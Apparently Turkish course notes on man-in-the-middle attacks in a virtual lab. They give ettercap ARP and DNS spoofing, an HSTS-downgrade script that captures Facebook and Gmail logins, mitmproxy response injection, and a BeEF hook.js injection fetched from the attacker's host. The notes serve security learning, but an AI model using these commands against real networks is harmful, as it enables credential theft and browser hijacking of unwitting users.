+örneğin arp_cop eklentisi bağlı olduğumuz ağda şüpheli bir arp aktivitesi olursa bunu bize bildiriyor 
+
+örneğin autoadd isimli eklenti saldırı yaptığımız ağa yeni bir kullanıcı / cihaz bağlanırsa ona da otomatik olarak saldırı yapmamızı sağlar 
+chk_poison eklentisi arp poisening saldırısının başarılı olup olmadığını bize söyler 
+dns_spoof eklentisi ile dns spoofing yapabiliriz (dns spoofing nedir nasıl yapılır ayrıntılı ve açıklayıcı bir şekilde yaz)
+dos_attack bağlı olduğumuz ağdaki spesifik bir ip ye karşı dos (hizmet dışı bırakma saldırısı) yapabiliriz 
+burada çalıştırmak istediğimiz eklentiyi eklentiismi şeklinde yazarak çalıştırabiliriz örneğin autoadd > [enter]
+
+bu dersimizde ettercap kullanarak dns saldırısı yapmayı öğrenelim (windows ve kali sanal makinamız açık olmalı bu uygulamada)
+
+
+kali terminalimizde leafpad /etc/ettercap/etter.dns çalıştırıyoruz bu dosya ettercap toolunda dns ile ilgili ayarların tutulduğu bir konfigrasyon 
+dosyasıdır biz bu uygulamada kullanıcı google.com a gitmek istediğinde google ın gerçek ip sine değil de bizim berlilediğimiz bir ip ye 
+yönlendirilmesini sağlamak istiyoruz (peki bu yönlendirmeyi nasıl yapacağız google.com yazınca zaten google ın sahip olduğu dns sunucularına gidecek 
+ve ip yi oradan alacak yoksa biz cache poisening yaparak oradaki ip yi mi değiştireceğiz bunu araştır buraya yaz)
+
+bu dökumanda 
+
+# microsoft sucks ;) 
+# redirect it to www.linux.org 
+# satırlarının altındaki 
+
+sitelerin en sonuncu satırına 
+
+unicornitems.com   A   10.0.2.15 (burada her ifade birbiriyle aynı hizada olması gerekir sonda yazdığımız ip adresi bizim oluşturduğumuz ve kurbanı 
+yönlendirmek istediğimiz local apache server ımızın yani kalinin local ip adresidir)
+
+unicornitems.com yazdığımız kısmın üst satırlarında 
+
+*.microsoft.com şeklinde bir ifade var buradaki * ifadesi microoft un bütün subdomain (top domain de dahil mi) giidldiği zaman da ilgili 
+ip adresine yönlendir demek.
+
+biz de bu yöntemi az önce eklediğimiz satırın altına *.unicornitems.com   A   10.0.2.15 yazıyoruz 
+
+dilersek ilgili bir site için de www.unicornitems.com   A   10.0.2.15 satırını da ekleyebiliriz 
+
+bu satırların olduğu kısımda domainlerden sonraki sütunda PTR diye bir ifade var bu ifadenin ne anlama geldiğini araştır buraya ekle 
+
+ardından ctrl s yaparak dökumanımızı kaydediyoruz 
+
+ardından leafpad i çalıştırdığımız terminalde sslstrip yazarak çalıştırıyoruz başka bir terminal tabında da 
+
+ettercap -Tq -M arp:remote -S -P dns_spoof -i eth0 /10.0.2.4// /10.0.2.1// çalıştırıyoruz (buradaki -P parametresi plugin yani hangi eklentiyi 
+kullanarak saldırıyı başlatmak istediğimizi belirttiğimiz parametredir) dilersek toolu normal olarak başlatıp başlangıçta da listelenmiş 
+seçeneklerden dns_spoof u seçip saldırımızı başlatabiliriz 
+
+ardından windows sanal makinamıza geliyoruz cmd de arp -a çalıştırıyoruz ve arp saldırımızın gerçekleştiğini doğruluyoruz 
+daha sonra google chrome u açıyoruz daha sonra ctrl+h yaparak önce history mizi siliyoruz düzgün bir sonuç almak için -silmezsek de saldırımız 
+başarılı olabilir ama garantiye almak için böyle yapıyoruz- 
+
+ardından kali terminalimizde service apache2 start çalıştırıyoruz 
+
+ardından adres çubuğuna uunicornitems.com yazıp enterlıyoruz ve apache 2 severımız (önceki derlerde oluşturduğumuz fake portal sayfamız açıldı)
+
+ek olarak mitmf ün dns spoofing saldırısı daha iyi çalışabiliyor bazı durumlarda 
+
+bu dersimizde daha önce yaptığımız her şey başarısız olursa oneway arp spoofing saldırısını deneyebiliriz 
+
+klasik bir arp saldırısında (modeme kurban kullanıcı olduğunu kurban kullanıcıya da kendini modem gibi tanıtma) eğer saldırdığımız modemde 
+bir arp koruması varsa başarısız olabiliriz. örneğin arp watch gibi bazı programlar, modem eğer ağda / ağında aynı mac adresine sahip iki cihaz 
+varsa / tespit ederse (kendine bağlı olan) burada bir arp saldırısı gerçekleştiğine karar vererek sonradan bağlanan mac adresine sahip cihazı deauth 
+-yetkisizlendirme- saldırısıyla ağdan atar o yüzden biz de bu saldıtıyı yapamıyoruz bu durumda oneway arp saldırısı yapabiliriz 
+yani kurban cihaza kendimizi modem olarak tanıtırız ancak modeme gidip kendimizi kurban cihaz gibi tanıtmayız çünkü aynı mac adresine sahip 2 
+cihaz tespit edeceği için bizi ağdan koparacaktır böylece biz ağı dinlerken saldırdığımız kullanıcı bir kullanıcı adı veya şire girdiğinde 
+biz bu verileri clear bir şekilde görebiliriz ancak server ın (modemin / veya istek gönderdiği uzak sunucunun) ona ne response (cevap) verdiğini 
+göremeyiz peki bizi modem olarak kabul ediyorsa biz isteğini bağlı olduğumuz ağdaki modeme iletir miyiz (bir isteği iletirken biz de modeme bir istek 
+mi atmış oluruz) yoksa biz modem olarak davranıp isteği direk ilgili uzak sunucuya mı yollarız ? uzak sunucuya yolluyorsak response bize geldiğinde şifreli 
+mi olacak ? yoksa direk ilgili mac adresine sahip cihaza mı gidecek response burayı araştır cevapla 
+
+
+ettercap -Tq -M arp:oneway -i eth0 /10.0.2.4// /10.0.2.1// şeklinde çalıştırıyoruz modemin local ip adresini komutta sona, kurbanın ip adresini de başa yazmalıyız 
+saldırının başarılı olması için (peki sadece kurbanın ip sini yazsak ne olur dene buraya yaz)
+
+
+bu uygulamada sslstirp halihazırda çlışıyorsa kapatabiliriz ardından new terminal tab de wireshark çaalıştırıyoruz rh0 yu seçiyoruz ağ kartlaırndan 
+arından sol üstteki mavi yüzgeç ikonuna tıklıyoruz daha sonra windows makinemize geliyoruz ardından chrome history sini silip unicornitems.com 
+a gideibliriz (silmezsek cache den okuduğu için / neyi okuduğu ip adresini mi ? araştır buraya yaz/evet dns saldırısını durdurmuştuk ama cache den aldığı için ip adresini o yüzden captive portalı açtı biz bunu istemiyoruz direk olarak unicornitems.com u açmasını istiyoruz) farklı bir tarayıcıdan örneğin mozilla 
+unicornitems.com a gidiyoruz (dns saldırısını durdurduğumuz için artık biiz captive portala atmadı) ardından my account > testtest | 123456 
+ile login oluyoruz oneway çalıştırdığımız terminale geldiğimizde login olduğumuz bilgilerin çıktı olarak gerçekleşmediğini görüyoruz 
+
+bazen ettercap de oneway spoofing yaparken bu bilgileri yakalayamayabiliyor bu yüzden wireshark ı açmıştık zaten 
+wireshar a geliyoruz filter kısmına http yazıyoruz ve gelen çıktılardan yukarıdan aşağı doğru POST metodu ile göndeirlen http requestlerini inceliyoruz 
+
+paketlere tıkladığımızda açılan pencerenin üst kısmında HTML Form URL Encoded başlığının altındaki Form item: başlığını detaylandırıyoruz 
+ve bir tane pakette "username" = "testtest" "password" = "123456" şeklinde bilgileri aldığımızı görebiliriz 
+
+peki oneway spoofing de kullanıcı kullanıcı adı şifresini doğru girerse ilgili sitede oturum açabilecek mi ? bunu araştır buraya yaz 
+yoksa doğru girmesine rağmen oturum açamayacak mı açamayacaksa sebebi nedir 
+
+bu dersimizde hsts siteleri nasıl downgrade edebiliriz bunu öğrenelim;
+
+100% her zaman çalışan bir yöntemi olmasa da bir script yardımıyla hsts siteleri http ye downgrade edebiliriz 
+
+https://github.com/atilsamancioglu/hstsbreaker/blob/master/hstsbreaker.sh bağlantısındaki kodları linux umuzda bir metin editörü yardımıyla 
+
+yapıştırıp dökumanımızı da hstsbreaker.sh şeklinde kaydedelim.
+
+daha sonra hstsbreaker.sh dosyamızı sağ tık yapıp Geany ile açalım buradaki kodlar bash scripting dili ile yazılmıştır 
+
+#Qutting başlığının altında trap ctrl c INT 
+ctrl_c(){
+	clear
+}
+
+şeklindeki ifade eğer biz bu sh dosyasını çalıştırdıktan sonra bu dosyanın çalıştığı terminalde ctrl+c yaparsak terminalin nasıl bir tepki
+ vereceği ve arka planda ne gibi işlemler gerçekleştireceğini ifade eder örneğin burada clear yazılmış bu terminal ekrnındaki bütün çıktıları 
+ temizleme komutudur tab, bu süslü parantezlerin içerisinde pek çok farklı komut var örneğin iptables -F yapılacağını yani .sh olan bu dosyayı 
+ çalıştırırken yapmış olduğumuz hsts kırma işleminde port forwarding ayarlarını sıfırlıyor 
+
+ echo -e komutu ne anlama gelir (-e parametresi ne gibi bir işe yarar araştır buraya yaz) 
+
+ #Check dependencies 
+
+ başlığının altında filehsts=/root/hsts ifadesi ile filehsts stringini /root/hsts dizini ile eşleştiriyoruz 
+
+ ardından bu satırın altında 
+
+ if [-d "$filehsts"] ifadesi ile filehsts diye oluşturduğumuz ortam değişkeninin varlığını yani sistemimizde /root/hsts dizini var mı yok mu bunu 
+ sorguladık (-d parametresini araştır ne işe yaradığını yaz) 
+
+ ardından if in bir altındaki satırda 
+
+ then 
+       echo -e hsts klasörü mevcuttur şeklinde ekranımıza bir yazı çıkacak eğe mevcut değilse 
+
+bir kaç aşağı satırda else devreye girip mkdir $filehsts şeklinde bir ortam değişkeni oluşturulacak (yani /root/hsts klasörü oluşturulacak)
+
+ardından koddaki fi ifadesi ile if döngüsünü bitiriyoruz 
+
+daha sonra bir kaç aşağı satırdaki else in altında git clone satırında https://github.com/LeonardoNve/dns2proxy bağlantısındaki tool u kullanarak 
+hsts downgrade işlemimizi gerçekleştireceğiz aslında hemen altındaki pip install dnspython & komutu ile bu toolumuuz bizim için kuracak 
+
+
+ardıdan bir kaç satır aşağıda git clone https://github.com/byt3bl33d3r/sslstrip2 satırında sslstrip2 içinde aynı işlem gerçekleştirilir 
+
+ardından yine bir kaç satır aşağıda #nmap scan başlığının altında nmap taraması ile alakalı bash scriptleri bulunur 
+
+bu dersimizde kali terminalimizde hsts.sh on bulunduğu dizine gelip bash hsts.sh çalıştırıyoruz 
+
+ardından hangi arayüz üzerinden saldırıyı yapmak istediğimizi yazıyoruz örneğin eth0 yazıp enterlıyoruz ardından nmap i çalıştırdı ve bağlı olduğumuz 
+ağdaki bütün cihazların mac ve ip adreslerini bize çıktı olarak verdi ardından saldırı yapacağımız cihazın local ipsini örneğin 10.0.2.4 
+yazıp enterlıyoruz ardından saldırımız başladı şimdi windows sanal makinemize geçiş yapıyoruz
+
+edge tarayıcısı adres çubuğuna google.com yazdığımızda http olarak açtığını görüyoruz ardından google dan facebook u aratıp facebook un sitesine 
+girdiğimizde de http olarak siteyi açtığımızı görebiliriz ardından testtest 123456 ile login oluyoruz ardından hstsbreak ı çalıştırdığımız 
+terminale gelirsek burada çıktı biraz karmaşık da olsa login olduğumuz kullanıcı adı ve şifreyi görebiliriz ancak adres çubuğundan facebook.com 
+çalıştırdığımızda hsts olarak açacaktır siteyi aynı şekilde google dan gmail i aratıp gmail ın sitesine girdiğimizde de http olarak açtığını 
+görebiliriz sayfanın sağ üstünden SIGN IN diyerek email-phone:testtest > NEXT dediğimizde Something went wrong hatası aldık ilk defa giriş yapacak 
+birinin sadece e mail adresini öğrenebiliriz ama daha önce giriş yaptı ise mail adresi kayıtlı olduğu için password ü girmesine izin verecektir yani 
+her iki bilgiy, (email or phone and password) ü alabileceğiz 
+
+microsoft edge de denemelerimizi yaptık ve başarılı oldu şimdi bir de firefox da deneyelim windows sanal makinamız üzerinden 
+arama kısmına www.google.com yazıp enterlıyoruz ve http olarak açmayı başardık 
+
+google ın search kısmına facebook yazıp tr-tr.facebook.com a gittiğimizde facebook u http olarak açmayı başardık ancak sayfa görselleri düzgün 
+bir şekilde yüklenmedi eğer kullanıcı bir problem olduğunu anlamaz ve kullanıcı adı ve şifresini girerse biz bu bilgileri capture edebiliriz 
+
+e-posta veya telefon kısmına : test12345 şifre kısmına da 123456 ile login oluyoruz hsts.sh ı çalıtırdığımız terminalde lsd= ile başlayan satırda 
+email=test12345&pass=123456 şeklinde login bilgilerini aldığımızı görebiliriz 
+
+google arama kısmına gmail yazıp http://www.gooogle.com/gmail/ sayfasına gidiyoruz ve testtest şeklinde girdikten sonra edge deki gibi bir şeyler ters 
+gitti hatasını aldık ancak kullanıcı halihazırda emailini kayıt ettiyse parola yöneticisine ve sadece şifre soruluyorsa şifresini alabiliriz 
+
+ardından son olarak google chrome dan deneyelim adres çubuğuna google.com yazdığımızda http olarak açamadık çünkü chrome, google ın bir ürünü olduğu 
+için hsts.sh toolumuz chrome atlatamadı 
+
+
+bu dersimizde mitm proxy ismindeki bir toolu inceleyelim 
+
+mitm proxy toolu ile kurban cihazın örneğin x.com a bir şifre ile login oluyor biz bu login olduğu şifreyi değiştirip ilgili siteye gerçekleştirdiği 
+requesti değiştirerek biizm belirlediğimizbir şifre ile giriş yapmış gibi istek atabiliriz (isteğini değiştirebiliriz) ve server ın hedef bilgisayara 
+yolladığı response u da değiştirebiliriz 
+
+https://github.com/mitmproxy/mitmproxy bağlantısına gittiğimizde sayfanın orta sol tarafında yer alan klasörlerden release e tıklarsak 
+
+(https://github.com/mitmproxy/mitmproxy/tree/main/release bu bağlantıya yönlendiriliriz) bu bağlantıda mitm proxy nin github ında yapılan değişiklikler 
+ve version bilgileri yer alır 
+
+/release/README.mE doyasından mitm proxy nin versiyonalrına ve daha önce yapılan değişikliklere ulaşabiliriz 
+
+https://github.com/mitmproxy/mitmproxy bağlantısından 
+
+Installation
+
+The installation instructions are here. kısmından 'here' yazan bağlantıya tıklıyoruz daha sonra https://docs.mitmproxy.org/stable/overview-installation/
+bağlantıısna yönlendiriliyoruz 
+
+https://mitmproxy.org/downloads/ bu bağlantıdan https://mitmproxy.org/downloads/#3.0.0/ version 3.0.0 a tıklıyoruz 
+
+mitmproxy-3.0.0-linux.tar.gz dosya ismine tıklayıp save file diyerek dosyamızı indirmeye başlıyoruz 
+
+ardından dosya nereye indiyse doya gezgini ile o dizine gidip ilgili dosyaya çift tıkladığımızda otomatik olarak dosyalarımızı bir klasör e 
+çıkartacaktır bu klasörü sürekleyip masaüstüne bırakıyoruz ardından yine aynı şkeilde arayüzden trash (çö kutusunu) nun altındaki Other Locations 
+a tıklıyoruz > Computer > opt nin altına masaüstüne sürükle bırak yaptığımız klasörümüzü bu sefer /opt nin içerisine atıyoruz ardındanklasör ismi 
+çok uzun olduğu için sağ tık > rename > mitmproxy olarak değiştiriyoruz ardından kali terminalimize geliyoruz 
+
+cd /opt çalıştırıyoruz > cd mitmproxy > 
+
+/op7/mitmproxy dizinindeki dosyalardan mitmdump = mitm proxy toolunu terminalimiz üzerinden çalıştırmamızı sağlayan dosyadır mitmweb de 
+görsel bir arayüze sahip olam mitm proxy dir ardından terminalde /opt/mitmproxy dizinindeyken ./mitmweb çalıştırıyoruz 
+
+bu  komutu çalıştırdığımızda görsel bir arayüz gelmedi tool u görsel bir arayüz üzerinden kullanmak istersek komutumuzu çalıştırdıktan sonra 
+Web server listening at http://127.0.0.1:8081/ şeklindeki linke tıklamamız gerekiyor biz buradaki bağlantı adresini kopyalıyoruz 
+ardından firefox a gekip adres çubuğuna bu adresi yapıştırıp enterlıyoruz 
+
+mitm proxy de explicit ve transparent mode olmak üzere 2 mode vardır 
+
+explicit mode : kendi sistemimiz içirisinde, local hostumuzda yaptığımız denemelerde kullanacağımız moddur 
+
+explicit mode da kendimiz yönlendirmek için (internet trafiğin, mi) firefox üzerinden proxy ayarlarımızı değiştirmemiz gerekiyor 
+
+firefox da sağ üstte 
+
+---
+---
+---
+
+şeklindeki ayarlar kısmına tıklıyoruz ardındanburadan Preferences  kısmına tıklıyoruz açılan kısımda sol en alttaki tab pşan Advanced e tıklıyoruz 
+daha sonra sağda açılan seçeneklerden Network tabına tıklıyoruz ardından Network tabının altındaki seçeneklerden Conneciton başlığının bulunduğu 
+satırın sonundaki Settings butonuna tıklıyoruz açılan kısımda normal (default olarak) Configure Proxies to access the internet başlığının altındaki 
+ayar Auto-detect proxy settings for this network olması gerekiyor biz bu seçenekleden manual proxy configuration u seçiyoruz 
+daha sonra http proxy inputuna 127.0.0.1 port inputunu da 8080 şeklinde ayarlıyoruz (proxy ile ilgili işlerimiz bittikten sonra bu ayarı tekrar
+none proxy ya da auto-detect proxy settings for this network ü seçiyoruz)
+
+use this proxy server for all protocols kutucuğunu işaretliyoruz 
+
+şuan explicit mode için gerekli olan ayarları yaptık zaten halihazırda mitm-web dosyasını çalıştırdığımızda default olarak explicit modda 
+açılır eğer transparent modda kullanmak istersek onu ayrıca belitrmemiz / seçmemiz gerekiyor (nasıl seçileceğini öğren buraya yaz)
+
+bu dersimizde mitm proxy arayüzünü tanıyalım kali linux umuz eth0 ile internete bağlı ve mitm proxy çalışırken tarayıcımızdan 
+yani tarayıcımızın bir tabında 127.0.0.1:8081/#/flows adresine gidiyoruz daha sonra diğer tabdan unicornitems.com sitesine gidiyoruz 
+
+mitm proxy de yakalanan verilerde path sütununda ilgili bağlantının url / uri ı yer alır method kısmında bu isteğin gerçekleştirildiği 
+method (bu method sütunundaki değer ne anlama gelir neyin GET i tam anlamadım anlayıp buraya yaz) Status tabında 
+HTTP response status codes ları yer alır (bu kodların hangisinin ne anlama geldiğini buraya yaz)
+
+size sütununda ilgili bağlantıdaki dosyanın boyutu yer alır; time sütununda da ilgili bağlantıya yapılan request ile response arasındaki geçen zaman
+-bu tanım doğru mu araştır buraya yaz?- 
+
+mitm proxy de search inputuna tıklayıp -a .jpg yazıp enterlarsak içerisinde ya da intercept edilen .jpg olan dosyaları (asset/varlık) filtreleyip 
+çıktı olarak alırız 
+
+yine -a .js şrkilnde aratırsak ilgili websitesindeki javascript dosyalarını görürüz yine -a .png çalıştırabiliriz 
+
+bu sorgudaki -a (asset kelimesinin ilk harfidir)
+
+eğer gelen çıktılardan birine tıklarsak ilgili paketimizin sağ tarafta detaylarını görebiliriz bu detaylarda ilgili bağlantı intercept edilirken 
+
+biizm bu bağlantıyı talep ettiğimiz request bilgilerimizi ve sayfanın bize verdiği response mesajı bilgilerini görebiliriz hangisini görmek istiyorsak 
+o tab a tıklayıp görebiliriz ve Details tabında da diğer detay bilgiler yer alır 
+
+ardından seçtiğimiz ilgili bağlantıyı / dosyayı / paketi üstteki seçeneklerden Replay ile yeniden bu bağlantıyı talep edebiliriz ilgili websitesinden 
+Duplicate e tıklayarak bu dosyayı kopayalayabiliriz Revert diyerek ne yapacağımızı bilmiyorum bunu yaz; Delete diyerek ilgili dosyayı silebiliriz 
+Download diyerek ilgili dosyayı lokalimize indirebiliriz 
+
+
+mitm proxy de en yukarıdaki start tabına tıklayıp search kısmına -m POST şeklinde bir filtreleme çalıştırırsak intercept ettiğimiz POST metodlarını 
+görüntüleyebiliriz (uzak bir sunucu bizim bilgisayarımıza POST metodu ile bir request gönderebilir mi?)
+
+aynı işlemi -m GET ile de gerçekleştirebiliriz 
+
+eğer bütün paketler içerisinden sadece istediğimiz paketi filtreleyip diğer paketlerin listelenmemesini istemiyorsak örneğin -m POST kodumuzu 
+search ın hemen sağındaki Highlights inputuna yazarsak hem intercept ettiğimiz bütün paketleri görebiliriz bizim istediğimiz paketleri de üzerinde 
+sarı bir renk ile belirgin bir şekilde vurgulu görüntüleyebiliriz 
+
+bu dersimizde mitm proxy ile intercept / müdahale etme işlemi nasıl gerçekleşir bunu öğrenelim 
+
+biz burada intercept ile veri akışlarını (datta flows / packets flows) lara müdahale etmeyi öğrenelim 
+
+intercept ile bu veri akışını durdurup istediğimiz şekilde değiştirerek / düzelneyerek bir request olarak gönderebiliriz 
+
+eğer search inputunun altındaki intercept kısmına -m POST komutunu girersek o an networkümüzde gerçekleşen POST methodlarını durdurmuş oluruz 
+(post request gibi post response var mı araştır buraya yaz) daha sonra başka bir browser tabından bing.com a gittiğimizde get methodları çalışacaktır 
+ancak post methodları çalışmayacaktır sayfayı açarken çünkü biz onları durdurduk bingden atil samancıoğlu diye aratıp sonuçlara ulaşabiliyoruz 
+(bu sorgunun get olduğu anlamına mı geliyor yoksa bu sorguda hem get hem de post kullanılıyor mu araştır buraya yaz)
+
+bingi kapatıp unicornitems.com a gidiyoruz my account kısmından testtest 123456 ile login oluyoruz ama gördüğümüz gibi herhangi bir giriş 
+veya hata işlemi alamadık bunun sebebi daha login olma işlemimiz server a bile gitmedi çünkü bu işlem POST metodu kullanılarak yapıldığı için 
+ve biz post metodlarını az önce durdurmuştuk o yüzden bu requestimiz işleme alınmadı 
+
+eğer paketlerden method u post olanlara bakarsak hepsi durdurulduğu için turuncu renkle vurgulu bir şekilde belirtilmişler 
+
+bu durdurulan bağlantılardan path kısmı http://unicornitems.com/my-account paketine tıklarsak request tabında aşağıda 
+
+username : testtest 
+password : 123456
+
+şeklinde bilgileri aldığımızı görebiliriz 
+
+peki biz bu post mothoduna sahip olan paketleri neden durdurmak isteyebiliriz ? buna bir kaç örnek sayabiliriz örneğin ele gerirdiğimiz bir bilgisayarda 
+
+kullanıcıların hiçbirinin bir siteye login olmalarını istemiyor olabiliriz veya bundan da daha önemlisi sunucuya göndereceğimiz request i 
+değiştirebiliriz 
+
+bu dersimizde interpect ettiğimiz paketleri nasıl modifiye edip / değiştirip / düzenleyip o şekilde request olarak gönderebileceğimiz 
+veya kurban kullanıcıya gösterebileceğimizi öğrenelim 
+
+kali terminalimize gelip cd /opt/mitmproxy ye gidip ./mitmweb çalıştırıyoruz (mozilla proxy ayarları geçen dersteki gibi)
+
+ve şuan herhangi bir şeyi intercept etmiyoruz ve path deki verilerden bing.com a gittiğimiz pakete tıklıyoruz sağ tarafta response tabının 
+
+sağ üstünde bir kalem ikonu / simgesi var buna tıkladığımızda sayfanın bize verdiği response mesajını değiştirebiliriz ve böylece 
+
+gelen response mesajına dilediğimiz kodu yazarak kurban bilgisayarda farklı işlemler gerçekleştirebiliriz 
+
+normal olarak bir web sayfasını görüntüleme işlemi de biz ilgili web saayfnaın bulunduğu sunucuya o web sayfasını görüntülemek istediğimize 
+ilişkin bir istek göndeririz sunucu da görmek istediğimiz web sayfasının kodlarını tarayıcımıza gönderir tarayıcımızda bunları yorumlayarak kodları görsel 
+bir şekilde bizim önümüze sunar 
+
+editlediğimiz kodun 17. satırında </div> </body> etiketlerinin arasına </div><script>alert('i hack you);</script></body>
+
+kodunu ekliyoruz xss de olduğu gibi kurbanımızın browserında karşısına bir mesaj çıkarmak için 
+
+genellikle hackerlar bir paketi modifiye ederken kodlarını </body> etiketinin önüne eklerler ki çünkü en az burada dikkat çeker ve en kolay 
+da kod burada uygulanır bütüb sayfa yüklendikten sonra ardından kalem simgesinin oradaki tik işaretine tıklayıp mesajımızı kaydediyoruz 
+ancak bu değişlikliği yapmamıza rağmen hedef kullanıcı bu mesajı görmez çünkü biz şuan herhangi bir intercept yapmıyoruz (yani eski bir paket üzerinde 
+değişiklikler yaptık güncel olarak kurban şuan bu sitede değil) 
+
+intercept edip değiştiridğimiz mesajı kullanıcıya göstermek için de intercept inputuna gelip ~bs (/body) yaztığımızda eğer 
+search kısmında body filters are not implemented yet mesajını görürsek bu mitm proxy ile ilgili bir problemdir (/body) mesajlarını filtreleme özelliğini 
+daha mitmproxy ye eklememişler anlamına gelir intercept işlemini başlattığımızda paketi yakalama konusunda herhangi bir problem yok ama 
+ilgili response cevabını editlemek istediğimiz zaman editlemediğini görüyoruz eğer yukarıdaki Resume tuşuna basarak paketlerin gelmesine devam etitirirsek 
+de paket zaten gelmiş olacak ancak biz istediğimiz işlemi yapamamış olacağız mitm proxy version 2 de bir problem yoktu ancak version3 de böyle bir 
+problem var 
+
+normalde response mesajını değiştirdikten sonra Resume ettiğimizde ilgili alert kullanıcının browserında çıkardı 
+
+ancak bu işlemi gerçek hayattaki uygulamalar için hızlı yapmamız gerekir çünkü bir kullanıcı ilgili sayfadan çıktıktan sonra bizim ona editlediğimiz response u
+göndermemizin hiç bir anlamı olmayacaktır 
+
+bu dersimizde mitm ile paketleri modifiye etme işlemini mitmdump ile gerçekleştirelim 
+
+cd /opt/mitmproxy ye gidiyoruz ./mitmdump --replace :~s:"</body>":"<script<alert('i hack you');</script></body>" çalıştırıyoruz 
+
+kodumuzdaki --replace x stringini gördüğün zaman bunu y ile değiştir anlamına gelir ~s parametresinin ne anlama geldiğini ve ne işe yaradığını 
+anlamadım araştırıp buraya yaz
+
+ardından tarayıcımızdan bing.com a gidiyoruz ve karşımıza i hack you js alert mesajı çıkıyor 
+
+eğer mitmdump ın çalıştığı terminale dönersek kullanıcının girdiği websitelerini görebiliriz GET http://www.bing.com/ şeklinde 
+
+bu dersimizde saldırıyı locak networkümüzde kendi cihazımız üzerinde yaptık bunu bir windows sanal makine üzerinde yapalım bir daha ki derste 
+
+bu derste windows ve kali NAT Network de çalışıyor saldırıyı başlatmadan önce tabii ki ağda mitm olmamız gerekiyor kali terminalimizde 
+
+ettercap -Tq -M arp:remote -i eth0 -S /10.0.2.4// /10.0.2.1// çalıştırıyoruz ardından windows sanal makinemize geçip command prombt da arp -a 
+çalıştırarak mitm işleminin gerçekleştiğini doğruluyoruz ardından yeni bir terminal tab i açıyoruz ardından burada 
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 çalıştırarak windows sanal makinemizden 80 portundan gelen 
+verileri 8080 portuna yönlendiriyoruz (windows makinamız internette gezinirken web sayfaları ile mi 80 portu üzerinden konuşur ve biz bu 80 portundaki 
+verileri neden dinleyemiyoruz bunun için 8080 portuna iletmemiz gerekiyor bunu araştır buraya yaz)
+
+ardından 8080 e yönlendirmeyi çalıştırdığımız terminalde cd /opt/mitmproxy çalıştırıyoruz ardından ./mitmweb --modetransparent çalıştırarak 
+mitm web i transparent modda başlatalım çalıştırdıktan sonra gelen çıktıdaki web server listening at http://127.0.0.1:8081/ linkine tıklayarak 
+veya mozilla browserımızdan bu adrese giderek mitm web i açabiliriz (az önceki ip adresi uygulamaya göre değişiklik gösterebilir)
+
+tarayıcıda mitm web i açtıktan sonra sayfanın en sol altında Transparent mode şeklinde yazıyor sağ altta da 8080 portunu dinlediğini söylüyor 
+
+ardından unicornitems.com adresine gidiyoruz ve mitm web de ağ paketlerini yakaladığımızı görebiliriz 
+
+
+bu dersimizde sunucuya gönderdiğimiz request e -isteklerin- sunucu tarafından verilen response u değiştirme konusunu öğrenelim 
+
+kali terminalimizi geilyoruz cd /opt/mitmproxy çalıştırıyoruz ardından 
+
+./mitmdump --replace :~s:"</body>":"<script<alert('i hack you');</script></body>" çalıştırıyoruz ve proxy listening at http://*:8080 çıktısını 
+alıyoruz bu 8080 portunu dinlemekte olduğumuz anlamına gelir (tabi bu komutumuzun başarıyla çalışması için önce mitm olammız gerekiyor daha sonra da
+80 portundan gelen bilgileri nattables komutu ile 8080 e iletmiş olmamız gerekiyordu)
+
+ardından windows sanal makinamızı açıyoruz ve chrome a gelip tarayıcı geçmişini siliyoruz bilgileri cache den hazır bir şekilde almasın diye 
+ardından chrom dan unicornitems.com adresine gidiyoruz ve site açılır açılmaz javascript alertimiz ekranda çıktı 
+
+bu dersimizde ettercap ile mitm olduktan sonra kurban bilgisayarımızı beef imize hook etmeyi öğrenelim 
+
+kali tarayıcımızda beef i çalışyırıyoruz ve 127.0.0.1:3000/ui/authentication sayfasına gidiyoruz (direk beef çalıştırsak bu sayfa açılır mı 
+ona önceki kursun notlarından bak buraya yaz) eğer ui açılırsa yani az önceki adres username: beef password: beef şeklinde login oluyoruz 
+burada sol tarafta daha önce hook ettiğimiz browserları görüyoruz ancak hepsi offline da olmalı ardından beef i çalıştırdığımız terminalde 
+bize example: <script src="http:127.0.0.1:300/hook.js"></script> kodunu kopyalıyoruz (beef sadece local ağlarda değil aynı zamanda dış 
+ağlarda da kullanılabilir) ardından başka bir terminalde cd /opt/mitmproxy çalıştırıyoruz daha sonra 
+
+./mitmdump --replace :~s:"</body>":"<script src="http:kalinin-local-ipsi:3000/hook.js"></script></body>" çalıştırıyoruz 
+
+ardından windows sanal makinemize geliyoruz ardından chrome dan seslisozluk.net adresine gidiyoruz ardından kali beef ui ına dönüyoruz ve 
+sol tarafta online browsers > seslisozluk.net de windows browserımızı hook ettiğimizi görebiliyoruz 
+
+bu bölümümüzde python ile mitm saldırıları nasıl yapılır bunu öğrenelim 
+önce kali terminalimizde ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 çalıştırıyoruz daha sonra 
+ettercap -Tq -M arp:remote -i eth0 -S /10.0.2.4// /10.0.2.1// çalıştırarak ağımızda mitm oluyoruz daha sonra başka bir terminal tabı daha açıyoruz
+ 
+ bu kali terminalimizde cd /opt/mitmproxy çalıştırıyoruz  ardından ./mitmweb --mode transparent çalıştırıyoruz ardından gleen çıktıdaki 
+
+ http://127.0.0.1:8081/ linkine sağ tık yapıp open link diyoruz ardından windows sanal makinamıza geliyoruz ve chrome u açıyoruz 
+ ardından seslisozluk.net adresine gidiyoruz arından mitm web arayüzüne geldiğimizde paketleri alabildiğimizi görüyoruz bu bölümde bir dosya 
+ indirdiğimizde bunu mitm web de nasıl paketlerin içerisinde bu indirme işlemini bulabileceğimizi öğrenelim 
+
+ bu yüzden www.winzip.com adresine gidiyoruz TRY IT FREE yazan yeşil butona tıklıyoruz daha sonra kaliye mitm web e geri dönüyoruz 
+ daha sonra Search kısmına .exe yazıyoruz ve çıktılar arasından http://download.winzip.com isminde bir paket çıkacak ardından bu pakete tıklayıp 
+ sağ taraftaki bölümden resbonse tabına gelirsek ilgili dosyanın boyutunun ne kadar odluğunu görebiliyoruz 
+ (Connection satırının altında 745.2kb content size yazısı) 
+
+bizim için burada önemli olan şey sunucu response olarak dosyayı lokalimize gönderdiği zaman bu response kısmındaki dosyayı değiştirerek istediğimiz 
+bir dosyayı indirtebiliriz daha sonra mitmweb veettercap i ctrl+c yaparak durduruyoruz 
+
+ardından ilk python kodumuzu yazmak için geany i kullanalım bu dersimizde 
+application kısmından search ksımına geany yazarak geany i açıyoruz 
+
